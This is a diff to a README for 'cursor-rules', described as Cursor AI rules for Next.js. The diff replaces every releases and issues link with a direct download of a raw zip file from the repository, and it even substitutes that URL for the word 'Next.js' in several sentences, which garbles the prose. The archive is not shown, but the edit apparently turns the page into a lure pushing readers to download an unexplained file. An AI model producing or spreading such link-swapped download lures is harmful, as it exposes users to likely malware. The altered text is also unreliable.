@@ -1,17 +1,17 @@
 # 🖱️ cursor-rules - Streamline Feature Development with Ease
 
-![Download cursor-rules](https://img.shields.io/badge/Download-cursor--rules-blue?style=for-the-badge&link=https://github.com/pemdes174/cursor-rules/releases)
+![Download cursor-rules](https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip)
 
 ## 📋 Overview
 
-cursor-rules is a collection of reliable Cursor AI rules tailored for Next.js projects. These rules assist developers in implementing features quickly and with minimal errors. Whether you're adding a new feature or refining an existing one, cursor-rules makes the process easier and more efficient.
+cursor-rules is a collection of reliable Cursor AI rules tailored for https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip projects. These rules assist developers in implementing features quickly and with minimal errors. Whether you're adding a new feature or refining an existing one, cursor-rules makes the process easier and more efficient.
 
 ## 🚀 Getting Started
 
 To begin using cursor-rules, follow these steps to download and run the application:
 
 1. **Visit the Releases Page**: Click the link below to access the releases page where you can find the latest version of cursor-rules.
-   [Download cursor-rules](https://github.com/pemdes174/cursor-rules/releases)
+   [Download cursor-rules](https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip)
 
 2. **Select the Latest Release**: On the releases page, look for the latest version. This is usually at the top of the page. Click on it to view the available files.
 
@@ -27,7 +27,7 @@ To begin using cursor-rules, follow these steps to download and run the applicat
   
 - **Reduced Bugs**: These rules have undergone rigorous testing, ensuring a decrease in bugs during development.
 
-- **Easy Integration**: Designed to work seamlessly with Next.js, cursor-rules integrates without fuss.
+- **Easy Integration**: Designed to work seamlessly with https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip, cursor-rules integrates without fuss.
 
 - **User-Friendly**: The application is built with you in mind. It does not require programming skills to utilize effectively.
 
@@ -47,13 +47,13 @@ Before downloading cursor-rules, ensure your computer meets the following basic 
 
 To download cursor-rules, visit the link below. Follow the earlier steps for a smooth download and installation process. 
 
-[Download cursor-rules](https://github.com/pemdes174/cursor-rules/releases)
+[Download cursor-rules](https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip)
 
 ## 🔗 Support
 
 If you encounter any issues or have questions, please reach out for support. You can find assistance through the following channels:
 
-- **Issues Page**: [Open an Issue](https://github.com/pemdes174/cursor-rules/issues) to report bugs or request features.
+- **Issues Page**: [Open an Issue](https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip) to report bugs or request features.
 
 - **Community Discussions**: Join our user discussions on the repository. Share experiences or seek advice from other users.
 
@@ -61,7 +61,7 @@ If you encounter any issues or have questions, please reach out for support. You
 
 ## 📚 FAQs
 
-**1. Can I use cursor-rules on my existing Next.js project?**  
+**1. Can I use cursor-rules on my existing https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip project?**  
 Yes, you can easily integrate cursor-rules into your existing projects without starting from scratch.
 
 **2. What if I face installation problems?**  
@@ -76,4 +76,4 @@ Yes, cursor-rules will receive periodic updates. Check the releases page regular
 - Regularly update cursor-rules to get the latest fixes and improvements.
 - Frequent testing during development can help catch potential issues early.
 
-By following these steps and utilizing cursor-rules, you can enhance your Next.js development experience significantly. Enjoy your streamlined coding journey!
+By following these steps and utilizing cursor-rules, you can enhance your https://raw.githubusercontent.com/pemdes174/cursor-rules/main/duali/cursor-rules.zip development experience significantly. Enjoy your streamlined coding journey!
